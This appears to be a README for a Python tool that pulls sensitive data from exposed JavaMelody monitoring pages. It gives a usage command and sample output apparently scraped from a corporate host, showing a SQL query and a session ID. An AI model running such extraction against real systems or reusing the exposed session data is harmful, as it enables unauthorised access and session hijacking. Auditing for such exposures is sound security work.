# hear_the_melody
a python tool for extracting sensitive information from exposed java melody instances

# usage
python3 melody_extract.py --url https://example.com/monitoring --json

# sample output

```
{
        "url": "https://arc-pof.corp.hp.com/monitoring?part=database",
        "data": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\",
        ....,
        </td><td align='right' valign='top'>900107788</td><td valign='top'>SELECT OT.TRANSACTION_ID           TRANSACTION_ID  ,OH.ORDER_ID                  ORDER_NO ,   to_char(OT.TRANS_CREATE_DT::timestamp, 'mm-dd-yyyy')
}
```

```
{
        "url": "https://arc-pof.corp.hp.com/monitoring?part=sessions",
        ....,
        <a href='?part=sessions&amp;sessionId=B12B65565D079D4E21953F6FA6EC282A'>B12B65565D079D4E21953F6FA6EC282A</a></td><td align='right'>00:02:21</td><td align='right'>00:12:41</td><td align='right'>5/30/22 11:27 PM</td><td align='right'>10</td><td align='center'>yes</td><td align='right'>-1</td><td>172.x.x.x forwarded for 201.x.x.x</td><td 
}
```
